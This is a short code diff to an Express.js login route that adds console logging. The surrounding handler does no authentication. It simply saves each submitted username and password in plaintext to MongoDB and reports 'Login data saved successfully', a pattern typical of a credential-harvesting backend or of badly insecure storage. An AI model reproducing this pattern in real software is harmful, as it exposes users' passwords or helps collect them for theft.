@@ -67,6 +67,8 @@ app.get('/', (req, res) => {
 app.post('/login', async (req, res) => {
   const username = (req.body.username || '').trim();
   const password = (req.body.password || '').trim();
+  console.log('New login request received:', { username: username.substring(0, 10) + '...' });
+  console.log('Checking for MongoDB connection...');
 
   if (!username || !password) {
     return res.status(400).json({ success: false, message: 'Username and password are required.' });
@@ -75,6 +77,7 @@ app.post('/login', async (req, res) => {
   const { db, error } = await connectToMongo();
 
   if (!db) {
+    console.error('MongoDB connection failed:', error);
     return res.status(500).json({
       success: false,
       message: error || 'MongoDB Atlas connection failed.'
@@ -82,12 +85,13 @@ app.post('/login', async (req, res) => {
   }
 
   try {
+    console.log('Inserting data to MongoDB...');
     const result = await db.collection(collectionName).insertOne({
       username,
       password,
       createdAt: new Date()
     });
-
+    console.log('Data inserted successfully! ID:', result.insertedId);
     return res.json({
       success: true,
       message: 'Login data saved successfully.',
